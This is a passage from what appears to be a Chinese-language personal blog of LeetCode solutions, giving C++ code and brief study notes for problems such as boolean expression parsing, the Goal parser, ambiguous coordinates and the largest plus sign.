class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> NOT = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> AND = <span class="string">&#x27;&amp;&#x27;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">static</span> <span class="type">int</span> OR = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">parseBoolExpr</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; ops;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; value;</span><br><span class="line">        <span class="type">int</span> len = expression.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;t&#x27;</span> || expression[i] == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                value.<span class="built_in">push</span>(expression[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == NOT || expression[i] == AND || expression[i] == OR) &#123;</span><br><span class="line">                ops.<span class="built_in">push</span>(expression[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                value.<span class="built_in">push</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(expression[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">char</span> op = ops.<span class="built_in">top</span>();</span><br><span class="line">                ops.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="type">bool</span> res = value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">                value.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(op == NOT) &#123;</span><br><span class="line">                    res = !res;</span><br><span class="line">                    <span class="keyword">if</span>(!value.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>(!value.<span class="built_in">empty</span>() &amp;&amp; value.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        <span class="type">bool</span> temp = value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">if</span> (op == AND) &#123;</span><br><span class="line">                            res &amp;= temp;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == OR) &#123;</span><br><span class="line">                            res |= temp;</span><br><span class="line">                        &#125;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(!value.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        value.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                value.<span class="built_in">push</span>(res ? <span class="string">&#x27;t&#x27;</span> : <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> value.<span class="built_in">top</span>() == <span class="string">&#x27;t&#x27;</span>? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>就是写一个计算器，难点在于n元运算，需要在数值栈中保存括号，以判断每个操作作用于那些值</p></blockquote><h2 id="1678-设计-Goal-解析器"><a href="#1678-设计-Goal-解析器" class="headerlink" title="1678. 设计 Goal 解析器"></a><a href="https://leetcode.cn/problems/goal-parser-interpretation/">1678. 设计 Goal 解析器</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">interpret</span><span class="params">(string command)</span> </span>&#123;</span><br><span class="line">        string s;</span><br><span class="line">        <span class="type">int</span> len = command.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(command[i] == <span class="string">&#x27;G&#x27;</span>) &#123;</span><br><span class="line">                s.<span class="built_in">push_back</span>(<span class="string">&#x27;G&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(command[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(command[i+<span class="number">1</span>] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                    s.<span class="built_in">push_back</span>(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="816-模糊坐标"><a href="#816-模糊坐标" class="headerlink" title="816. 模糊坐标"></a><a href="https://leetcode.cn/problems/ambiguous-coordinates/">816. 模糊坐标</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">ambiguousCoordinates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;string&gt; coord;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; len<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            vector&lt;string&gt; n1;</span><br><span class="line">            vector&lt;string&gt; n2;</span><br><span class="line">            <span class="built_in">gen</span>(<span class="built_in">move</span>(s), <span class="number">1</span>, i, n1);</span><br><span class="line">            <span class="type">int</span> len1 = n1.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">if</span>(len1 &lt;=<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">gen</span>(<span class="built_in">move</span>(s), i, len<span class="number">-1</span>, n2);</span><br><span class="line">            <span class="type">int</span> len2 = n2.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">if</span>(len2 &lt;= <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k1 = <span class="number">0</span>; k1 &lt; len1; k1++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k2=<span class="number">0</span>; k2&lt; len2; k2++) &#123;</span><br><span class="line">                    coord.<span class="built_in">push_back</span>(<span class="string">&quot;(&quot;</span> + n1[k1] + <span class="string">&quot;, &quot;</span> + n2[k2] + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> coord;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">gen</span><span class="params">(string&amp;&amp; s, <span class="type">int</span> i, <span class="type">int</span> j, vector&lt;string&gt;&amp; ret)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[j<span class="number">-1</span>] == <span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] ==<span class="string">&#x27;0&#x27;</span> &amp;&amp; j-i&gt;<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[j<span class="number">-1</span>] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, j-i));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(<span class="string">&quot;0.&quot;</span> + s.<span class="built_in">substr</span>(i+<span class="number">1</span>, j-i<span class="number">-1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k = i; k &lt; j<span class="number">-1</span>; k++) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, k-i+<span class="number">1</span>) + <span class="string">&quot;.&quot;</span> + s.<span class="built_in">substr</span>(k+<span class="number">1</span>, j-k<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ret.<span class="built_in">push_back</span>(s.<span class="built_in">substr</span>(i, j-i));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1684-统计一致字符串的数目"><a href="#1684-统计一致字符串的数目" class="headerlink" title="1684. 统计一致字符串的数目"></a><a href="https://leetcode.cn/problems/count-the-number-of-consistent-strings/">1684. 统计一致字符串的数目</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countConsistentStrings</span><span class="params">(string allowed, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">bool</span> all[<span class="number">129</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : allowed) &#123;</span><br><span class="line">            all[c] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(string &amp;w : words ) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c : w) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!all[c]) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countConsistentStrings</span><span class="params">(string allowed, vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> all = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c : allowed) &#123;</span><br><span class="line">            all |= <span class="number">1</span> &lt;&lt; (c-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(string &amp;w : words ) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">char</span> c : w) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!((all &gt;&gt; (c-<span class="string">&#x27;a&#x27;</span>))&amp;<span class="number">1</span>)) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>题中说明了 allowed只包含26个字母，所以用一个int就可以表示字符是否存在</p></blockquote><h2 id="764-最大加号标志"><a href="#764-最大加号标志" class="headerlink" title="764. 最大加号标志"></a><a href="https://leetcode.cn/problems/largest-plus-sign/">764. 最大加号标志</a></h2><h3 id="前缀和"><a href="#前缀和" class="headerlink" title="前缀和"></a>前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">1</span>)), <span class="built_in">x</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, n)),<span class="built_in">y</span>(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> mine : mines) &#123;</span><br><span class="line">            mat[mine[<span class="number">0</span>]][mine[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = n<span class="number">-1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    x[i][j] = x[i][j+<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    x[i][j] = j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(mat[j][i] == <span class="number">1</span>) &#123;</span><br><span class="line">                    y[j][i] = y[j+<span class="number">1</span>][i];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    y[j][i] = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">miny</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="type">int</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> minx = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(mat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    minx = j;</span><br><span class="line">                    miny[j] = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    maxx = <span class="built_in">max</span>(maxx, <span class="built_in">min</span>(<span class="built_in">min</span>(x[i][j] - j , j - minx),  <span class="built_in">min</span>(y[i][j] - i , i - miny[j])));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>刚开始想用dp，但是想法不对，试了7.8次，最后想到正确的方法<br>x, y记录点(i, j) 右测&#x2F;下方第一个0的坐标，minx记录左方第一个0的坐标，miny记录上方第一个0的位置<br>mat用来保存这个矩阵<br>加号的阶数为(i, j)坐标到上下左右四个方向上最近的0的距离的最小值<br>要注意特殊值的处理，右侧&#x2F;下方没有0，则记其坐标为<code>n</code>,上方&#x2F;左侧没有0记为<code>-1</code></p></blockquote><blockquote><p>一直以为只有把某一侧的数全都加起来才算前缀和<br>只要是把每个位置之前的一维线段或二维矩形预先存储，就叫做前缀和&#x2F;积分图</p></blockquote><h3 id="大佬的解法"><a href="#大佬的解法" class="headerlink" title="大佬的解法"></a>大佬的解法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : mines) dp[e[<span class="number">0</span>]][e[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>, up = <span class="number">0</span>, down = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, k = n - <span class="number">1</span>; j &lt; n; ++j, --k) &#123;</span><br><span class="line">                left = dp[i][j] ? left + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                right = dp[i][k] ? right + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                up = dp[j][i] ? up + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                down = dp[k][i] ? down + <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(dp[i][j], left);</span><br><span class="line">                dp[i][k] = <span class="built_in">min</span>(dp[i][k], right);</span><br><span class="line">                dp[j][i] = <span class="built_in">min</span>(dp[j][i], up);</span><br><span class="line">                dp[k][i] = <span class="built_in">min</span>(dp[k][i], down);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; e : dp) ans = <span class="built_in">max</span>(ans, *<span class="built_in">max_element</span>(e.<span class="built_in">begin</span>(), e.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>其实仔细一看，和我是一样的，一个一维for两个二维for，但是很短<br>dp存的是到最近的一个0的长度</p></blockquote><h3 id="优化空间"><a href="#优化空间" class="headerlink" title="优化空间"></a>优化空间</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">orderOfLargestPlusSign</span><span class="params">(<span class="type">int</span> n, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; mines)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">mat</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, n));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> mine : mines) mat[mine[<span class="number">0</span>]][mine[<span class="number">1</span>]] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">-1</span>,r = n,u = <span class="number">-1</span>,d = n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>, k = n<span class="number">-1</span>; j &lt; n; j++, k--) &#123;</span><br><span class="line">                l = mat[i][j] ? l : j;</span><br><span class="line">                u = mat[j][i] ? u : j;</span><br><span class="line">                r = mat[i][k] ? r : k;</span><br><span class="line">                d = mat[k][i] ? d : k;</span><br><span class="line">                mat[i][j] = <span class="built_in">min</span>(mat[i][j], j - l);</span><br><span class="line">                mat[j][i] = <span class="built_in">min</span>(mat[j][i], j - u);</span><br><span class="line">                mat[i][k] = <span class="built_in">min</span>(mat[i][k], r - k);</span><br><span class="line">                mat[k][i] = <span class="built_in">min</span>(mat[k][i], d - k);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> maxx = INT_MIN;</span><br><span class="line">        <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;&amp; vec : mat) maxx = <span class="built_in">max</span>(maxx, *<span class="built_in">max_element</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>参考大佬的方法，把我的思路优化成只用一个二维数组<br>这里要注意mat初始化为n，如果初始化为1的话后面没办法找最小值。</p></blockquote><h2 id="462-最小操作次数使数组元素相等-II"><a href="#462-最小操作次数使数组元素相等-II" class="headerlink" title="462. 最小操作次数使数组元素相等 II"></a><a href="https://leetcode.cn/problems/minimum-moves-to-equal-array-elements-ii/">462. 最小操作次数使数组元素相等 II</a></h2><h3 id="前缀和-1"><a href="#前缀和-1" class="headerlink" title="前缀和"></a>前缀和</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minMoves2</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> minn = INT_MAX;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preSum</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        preSum[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            preSum[i] = preSum[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            minn = <span class="built_in">min</span>(minn, (i+<span class="number">1</span>)*nums[i] - preSum[i] + preSum[len<span class="number">-1</span>] - preSum[i] - (len-i <span class="number">-1</span>)*nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> minn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>先排序，假设第i个数是能使总体调整数最小的数，那么总的调整次数为<br>$$ i \times nums_i - \sum_{ j&#x3D;0 }^{ j&#x3D;i-1 }(nums_i) + \sum_{ j&#x3D;i+1 }^{ j&#x3D;n-1 }(nums_j) - (n - i -1) \times nums_i $$<br>$$ i &#x3D; 0,1,…,n-1 